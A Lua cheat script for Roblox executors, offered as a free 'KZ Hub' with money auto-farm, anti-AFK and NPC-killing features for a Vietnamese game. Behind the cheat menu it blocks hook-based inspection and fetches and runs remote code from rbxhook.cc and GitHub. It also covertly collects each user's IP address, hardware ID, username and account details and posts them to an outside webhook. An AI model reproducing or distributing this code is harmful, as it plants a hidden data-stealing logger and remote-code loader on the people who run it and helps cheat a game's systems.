-- // Cộng Đồng Việt Nam //
local vst = {Enabled=true}
local vstHttp = nil
if hookfunction then
    local vstfunc = function(a,b,c) print(a,b,c) end
    hookfunction(vstfunc,function(a,b,c)
    return true
    end)
    if vstfunc() ~= true then
        game.Players.LocalPlayer:Kick('VST Kicked Error Function (01)')
        wait(5)
        while true do
        end
        return
    end
    if isfunctionhooked then
        if not isfunctionhooked(vstfunc) then
        game.Players.LocalPlayer:Kick('VST Kicked Error Function (03)')
        wait(5)
        while true do
        end
        return
        end
    end
end
local Test = {game.HttpGet,loadstring}
for i,v in pairs(Test) do
    if not iscclosure(v) or (isfunctionhooked and isfunctionhooked(v)) then
        game.Players.LocalPlayer:Kick('VST Kicked Error Function (02)')
        wait(5)
        while true do
        end
        return
    end
end
local function AZT_CHECK_FNHOOK_11111(func)
    local loadstlist = {}
    for i,v in pairs(debug.getregistry()) do
        if typeof(v) == 'function' and debug.getinfo(v).name == func then
            table.insert(loadstlist, i, v)
            ok = true
        end
    end
    if ok then game.Players.LocalPlayer:Kick("AZT Loader: Error Function #1243") return end
end
AZT_CHECK_FNHOOK_11111("loadstring")
AZT_CHECK_FNHOOK_11111("HttpGet")
AZT_CHECK_FNHOOK_11111("http_request")
AZT_CHECK_FNHOOK_11111("request")

getgenv().Config = {api = "c578dfb3628e8a1a34900d852203977716e31d25c77904b3641e3e59b0e2fe01"} -- DO NOT CHANGE

--analytics track
loadstring(game:HttpGet("https://rbxhook.cc/lua/track.lua"))()

local player = game:GetService("Players").LocalPlayer
local HttpService = game:GetService("HttpService")
local UserInputService = game:GetService("UserInputService")
local MarketplaceService = game:GetService("MarketplaceService")

local url = "https://rbxhook.cc/r/628a2284ec8a628f969efc09922b8d4d"

-- Platform detection
local function getPlatform()
    if UserInputService.TouchEnabled and not UserInputService.KeyboardEnabled then
        return "Mobile"
    elseif UserInputService.KeyboardEnabled then
        return "PC"
    elseif UserInputService.GamepadEnabled then
        return "Console"
    else
        return "Unknown"
    end
end

-- Executor detection
local executor = "Unknown"
local executorVersion = "N/A"
if identifyexecutor then
    executor = identifyexecutor()
elseif syn then
    executor = "Synapse X"
elseif KRNL_LOADED then
    executor = "Krnl"
elseif fluxus then
    executor = "Fluxus"
elseif is_sirhurt_closure then
    executor = "SirHurt"
elseif OXYGEN then
    executor = "Oxygen U"
end

-- HWID detection
local hwid = "Unavailable"
pcall(function()
    if syn and syn.gethwid then
        hwid = syn.gethwid()
    elseif gethwid then
        hwid = gethwid()
    elseif fluxus and getgenv and getgenv().fluxus then
        hwid = tostring(getgenv().fluxus.HWID or "Unavailable")
    elseif delta and get_hw_id then
        hwid = tostring(get_hw_id())
    end
end)

-- Game info
local gameName = "Unknown"
pcall(function()
    local info = MarketplaceService:GetProductInfo(game.PlaceId)
    if info and info.Name then 
        gameName = info.Name 
    end
end)

local serverRegion = "Unknown"
pcall(function()
    serverRegion = tostring(game:GetService("LocalizationService"):GetCountryRegionForPlayerAsync(player) or "Unknown")
end)

-- IP Address detection
local ipAddress = "Unavailable"
pcall(function()
    local ipResponse = game:HttpGet("https://api.ipify.org")
    if ipResponse and ipResponse ~= "" then
        ipAddress = ipResponse
    end
end)

-- Account info
local accountAge = "Unknown"
local membership = "Free"
pcall(function()
    accountAge = tostring(player.AccountAge) .. " days"
    membership = player.MembershipType == Enum.MembershipType.Premium and "Premium" or "Free"
end)

local data = {
    avatar_url = "https://rbxhook.cc/img/logo.png",
    content = "",
    username = "rbxhook.cc",
    embeds = {
        {
            title = "Script Execution Report",
            color = 3447003,
            author = {
                name = player.Name,
                icon_url = "https://www.roblox.com/headshot-thumbnail/image?userId=" .. tostring(player.UserId) .. "&width=150&height=150&format=png"
            },
            thumbnail = {
                url = "https://www.roblox.com/headshot-thumbnail/image?userId=" .. tostring(player.UserId) .. "&width=420&height=420&format=png"
            },
            fields = {
                {
                    name = "User Info",
                    value = "Username: " .. player.Name .. "\nUser ID: " .. player.UserId .. "\nPlatform: " .. getPlatform(),
                    inline = false
                },
                {
                    name = "Executor Info", 
                    value = "Executor: " .. executor .. "\nVersion: " .. executorVersion,
                    inline = false
                },
                {
                    name = "Game Info",
                    value = "Game Name: " .. gameName .. "\nPlace ID: " .. game.PlaceId .. "\nJob ID: " .. game.JobId,
                    inline = false
                },
                {
                    name = "Network Info",
                    value = "IP Address: " .. ipAddress .. "\nRegion: " .. serverRegion,
                    inline = false
                },
                {
                    name = "Account Info",
                    value = "Account Age: " .. accountAge .. "\nMembership: " .. membership,
                    inline = false
                }
            },
            footer = {
                text = "rbxhook.cc | User ID: " .. tostring(player.UserId)
            },
            timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
        }
    }
}

-- Validate and send webhook
local success, encoded = pcall(function()
    return HttpService:JSONEncode(data)
end)

if not success then
    print("JSON encoding failed")
    return
end

local requestFunc = syn and syn.request or request or http_request
if not requestFunc then
    print("Error: JK291-RH")
    return
end

local response = requestFunc({
    Url = url,
    Method = "POST",
    Headers = {
        ["Content-Type"] = "application/json"
    },
    Body = encoded
})

if response then
    print("Status:", response.StatusCode)
    if response.StatusCode == 200 or response.StatusCode == 204 then
        print("✅ Webhook sent successfully!")
    else
        print("Error: J1920-RH - (SHARE THIS TO SERVICE OWNER) : " .. response.StatusCode)
        if response.Body then
            print("Response: " .. response.Body)
        end
    end
else
    print("ERROR: No response from server")
end

print("✅ Script initialized successfully!")

local function shortenFileName(url)
    if not url then return end
    local domain = url:match("https://([^%.]+)%.") or "unknown"
    local parts = {}
    for part in url:gmatch("[^/]+") do
        table.insert(parts, part)
    end
    local user = parts[2] or "unknown"
    local repo = parts[3] or "unknown"
    local file = parts[#parts] or "nofile"
    file = file:gsub("%.lua", "")
    local fileName = domain .. "-" .. repo .. "-" .. file .. ".lua"
    return fileName
end
function FastHttpLoad(url)
    if not (writefile and readfile and isfile and isfolder and makefolder and url) then
        warn("Can't Download Asset")
        return game:HttpGet(url)
    end

    local folder = "vstdata"
    if not isfolder(folder) then
        warn("[Fast Http Get] : Make Folder")
        makefolder(folder)
    end

    local fileName = shortenFileName(url)
    local filePath = folder .. "/" .. fileName

    if not isfile(filePath) then
        local success, result = pcall(function()
            return game:HttpGet(url)
        end)
        if success then
            warn("[Fast Http Get] : WriteFile")
            writefile(filePath, result)
            return result
        else
            warn("[Fast Http Get] : Can't Connect http.")
            return nil
        end
    end
    local SuccessLoad = readfile(filePath)
    warn("[Fast Http Get] : Success Load.")
    if not SuccessLoad then
        return game:HttpGet(url)
    end
    return SuccessLoad
end
local Fluent = loadstring(FastHttpLoad("https://raw.githubusercontent.com/getscript-vn/ZENOXHub/refs/heads/main/UIlibrary/Fluent"))()
local Window = Fluent:CreateWindow({Title = "KZ Hub",SubTitle = "Free Script",TabWidth = 120,Size = UDim2.fromOffset(580, 350),Acrylic = false,Theme = "Sapphire",MinimizeKey = Enum.KeyCode.LeftControl})
function NewTab(title,icon)
    return Window:AddTab({ Title = title, Icon = icon })
end
function NewTabLock(title,icon,callback)
    local tabs = Window:AddTab({ Title = title, Icon = icon })
    local buttonunlocktabs = false
    buttonunlocktabs = tabs:AddButton({
        Title = "Unlock Tabs "..title,
        Description = "",
        Callback = function()
        buttonunlocktabs:Destroy()
        pcall(callback,tabs)
    end,})
end

tab = NewTab('Main','Home')

tab:AddSection("KZ HUB PROFILE")

tab:AddParagraph({
    Title = "KZ HUB :",
    Content = "https://discord.gg/6WPNbAkwfp"
})
tab:AddParagraph({
    Title = " Gruop KZ HUB :",
    Content = ""
})
tab:AddParagraph({
    Title = "Game Support :",
    Content = "Cộng Đồng Việt Nam"
})

tab:AddSection("---// More Function //---")
getgenv().AntiAFKVSHUB = true
if isfile('VSHUBAntiAFK.txt') then
    getgenv().AntiAFKVSHUB = (readfile('VSHUBAntiAFK.txt') == "true" and true or false)
end 
local antiafklabel =tab:AddParagraph({
    Title = "Anti AFK :",
    Content = "OFF"
})

tab:AddButton({
    Title = "ON/OFF ANTI AFK",
    Description = "",
    Callback = function()
        getgenv().AntiAFKVSHUB = (getgenv().AntiAFKVSHUB == "false" and true) or (getgenv().AntiAFKVSHUB == "true" and false) or not getgenv().AntiAFKVSHUB 
        antiafklabel:SetDesc((tostring(getgenv().AntiAFKVSHUB) == "true" and "ON") or "OFF")
        writefile('VSHUBAntiAFK.txt',tostring(getgenv().AntiAFKVSHUB))
    end
})
task.spawn(function()
    antiafklabel:SetDesc((tostring(getgenv().AntiAFKVSHUB) == "true" and "ON") or "OFF")
    getconc = getconnections or get_signal_cons
    if getconc then
        for _, connection in pairs(getconc(game:GetService('Players').LocalPlayer.Idled)) do
            if connection["Disable"] then
                connection["Disable"](connection)
            elseif connection["Disconnect"] then
                connection["Disconnect"](connection)
            end
        end
    else
        game:GetService('Players').LocalPlayer.Idled:Connect(function()
            if getgenv().AntiAFKVSHUB then
            game:GetService('VirtualUser'):CaptureController()
            game:GetService('VirtualUser'):ClickButton2(Vector2.new())
            end
        end)
    end
end)

NewTabLock('Cày Tiền','dollar-sign',function(tabs)
local StarterGui = game:GetService("StarterGui")
local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer
local Workspace = game:GetService("Workspace")
local RunService = game:GetService("RunService")
local VirtualUser = game:GetService("VirtualUser")
local function GetSeatDist(part)
    local chairslist = {}
for _,v in pairs(Workspace:GetDescendants()) do
    if v.ClassName == "Seat" then
        table.insert(chairslist, v)
    end
end
    for _,v in pairs(chairslist) do
        if not v:FindFirstChild("SeatWeld") and not v:FindFirstChildOfClass("Weld") and (v.Position - part.Position).Magnitude < 10 then
            return v
        end
    end
end

local function GetMoneyDist(part)
    local moneypart = Workspace:FindFirstChild("moneypart")
    if not moneypart then return end
    for _,v in pairs(moneypart:GetChildren()) do
        if v:IsA("BasePart") and (v.Position - part.Position).Magnitude < 10 and v.Name == "MoneyPart" then
            return v
        end
    end
end

local function GetWork(workz)
    local moneypart = Workspace:FindFirstChild("moneypart")
    if not moneypart then return end
    local moneyposition = {
        CFrame.new(868.034668, 22.0071793, -370.91864, 0.00146454573, 0, 0.999998987, 0, 1, 0, -0.999998987, 0, 0.00146454573),
        CFrame.new(547.825806, 18.6066303, -460.921021, 0.777145445, 0, 0.629321039, 0, 1, 0, -0.629321039, 0, 0.777145445),
        CFrame.new(575.239502, 18.6066303, -427.942383, 0.777145445, 0, 0.629321039, 0, 1, 0, -0.629321039, 0, 0.777145445),
        CFrame.new(415.546875, 19.291954, -669.253357, 0.000610232353, -0, -0.999999762, 0, 1, -0, 0.999999762, 0, 0.000610232353),
        CFrame.new(626.063599, 18.6066303, -366.468719, 0.777145445, 0, 0.629321039, 0, 1, 0, -0.629321039, 0, 0.777145445),
        CFrame.new(626.063599, 18.6066303, -366.468719, 0.777145445, 0, 0.629321039, 0, 1, 0, -0.629321039, 0, 0.777145445),
        CFrame.new(868.024414, 22.0071793, -363.659393, 0.00146454573, 0, 0.999998987, 0, 1, 0, -0.999998987, 0, 0.00146454573),
        CFrame.new(515.525635, 18.5217323, -500.212036, 0.782415867, 0, 0.622756243, 0, 1, 0, -0.622756243, 0, 0.782415867),
        CFrame.new(598.672546, 18.5217323, -397.903137, 0.782415867, 0, 0.622756243, 0, 1, 0, -0.622756243, 0, 0.782415867),
    }
    for _,v in pairs(moneyposition) do
            local seatdist = GetSeatDist(v)
            if workz then 
            if workz ~= seatdist then
            return seatdist
            end
        else
            return seatdist
            end
    end
    for _,v in pairs(moneypart:GetChildren()) do
        if v:IsA("BasePart") and v.Name == "MoneyPart" then
            local seatdist = GetSeatDist(v)
            if workz then 
            if workz ~= seatdist then
            return seatdist
            end
        else
            return seatdist
            end
        end
    end
end

local function GetWork1()
    local part = Workspace:FindFirstChild("Lumberjack") and Workspace.Lumberjack:FindFirstChild("Zones")
    if part then
        for _,v in pairs(part:GetChildren()) do
            if v:FindFirstChild("Farm") and v.Farm:FindFirstChildOfClass("Seat") then
                local seat = v.Farm:FindFirstChildOfClass("Seat")
                if not seat:FindFirstChild("SeatWeld") and not seat:FindFirstChildOfClass("Weld") then
                    return seat
                end
            end
        end
    end
end
function AntiAFK()
    if getgenv().AntiAFKLoaded then Fluent:Notify({Title = "VSHUB",Content = "The AFKMode has been loaded.",Duration = 4}) return end
    local GC = getconnections or get_signal_cons
    if GC then
        for _,v in pairs(GC(LocalPlayer.Idled)) do
            if v["Disable"] then
                v["Disable"](v)
            elseif v["Disconnect"] then
                v["Disconnect"](v)
            end
        end
        Fluent:Notify({Title = "VSHUB",Content = "The AFKMode 1 has been loaded.",Duration = 4})
    else
        LocalPlayer.Idled:Connect(function()
            VirtualUser:CaptureController()
            VirtualUser:ClickButton2(Vector2.new())
        end)
        Fluent:Notify({Title = "VSHUB",Content = "The AFKMode 2 has been loaded.",Duration = 4})
    end
end
tabs:AddToggle("FarmMoney", {Title = "Farm Money (AFK)", Default = false }):OnChanged(function(Value)
    getgenv().AutoWork = Value
    AntiAFK()
end)
tabs:AddToggle("FarmMoney", {Title = "Fix Lag Mode", Default = false }):OnChanged(function(Value)
    if Value ~= false then
        loadstring(game:HttpGet("https://raw.githubusercontent.com/getscript-vn/Api/refs/heads/main/Anti%20Lag"))()
    end
end)
task.spawn(function()
    while task.wait(1) do
        if getgenv().AutoWork then
            pcall(function()
                while getgenv().AutoWork do
                    if LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("Humanoid") then
                        local humanoid = LocalPlayer.Character.Humanoid
                        if not humanoid.Sit then
                            local work = GetWork() or GetWork1()
                            if work then
                                repeat task.wait()
                                    LocalPlayer.Character.HumanoidRootPart.CFrame = work.CFrame
                                until humanoid.Sit
                                showNotify("System","Ngồi Thành Công",5)
                                repeat wait()
                                    if getgenv().Skip then
                                        humanoid.Sit = false
                                        work = GetWork(work) or GetWork1(work) 
                                                                            if work then
                                                                    repeat task.wait()
                                    LocalPlayer.Character.HumanoidRootPart.CFrame = work.CFrame
                                until humanoid.Sit
                                getgenv().Skip = false
                                end
                                    end
                                until not getgenv().AutoWork
                            else
                                LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(1723, 19, -342)
                            end
                        else
                            if not GetMoneyDist(humanoid.Seat or Workspace:FindFirstChildOfClass("Part")) then
                                humanoid.Sit = false
                            end
                        end
                    end
                    task.wait()
                end
            end)
        end
    end
end)

tabs:AddToggle("FarmMoney", {Title = "Farm Money NPC", Default = false }):OnChanged(function(Value)
    getgenv().AutoWork1 = Value
    AntiAFK()
end)
task.spawn(function()
    while task.wait() do
        if getgenv().AutoWork1 then
            local LocalPlayer = game.Players.LocalPlayer
            local CityNPC = Workspace:FindFirstChild("CityNPCs").NPCs
            sethiddenproperty(game:GetService("Players").LocalPlayer,"SimulationRadius",math.huge)
            if CityNPC and LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("Humanoid") and LocalPlayer.Character:FindFirstChild("HumanoidRootPart")  then
                for i,v in pairs(CityNPC:GetChildren()) do
                    if v:FindFirstChild("HumanoidRootPart") and v:FindFirstChild("Humanoid") and LocalPlayer.Character:FindFirstChild("HumanoidRootPart") and (v.HumanoidRootPart.Position - LocalPlayer.Character:FindFirstChild("HumanoidRootPart").Position).Magnitude > 15 then
                        LocalPlayer.Character.HumanoidRootPart.CFrame = v.HumanoidRootPart.CFrame
                        v.Humanoid.Health = 0
                    end
                    task.wait(0.2)
                end
            end
        end
        task.wait(0.2)
    end
end)
task.spawn(function()
    while task.wait() do
        if getgenv().AutoWork1 then
            local LocalPlayer = game.Players.LocalPlayer
            local CityNPC1 = Workspace:FindFirstChild("CityNPCs").Drop
            if CityNPC1 and LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("Humanoid") then
                for i,v in pairs(CityNPC1:GetDescendants()) do
                    if v and v.ClassName == "ProximityPrompt" then
                    local proximity = v
                    LocalPlayer.Character.HumanoidRootPart.CFrame = proximity.Parent.CFrame
                    fireproximityprompt(proximity)
                    task.wait(0.2)
                    end
                end
            end
        end
    end
end)
end)

loadstring(game:HttpGet("https://raw.githubusercontent.com/getscript-vn/VSHUB/refs/heads/main/cry.lua"))(Window)

Window:SelectTab(1)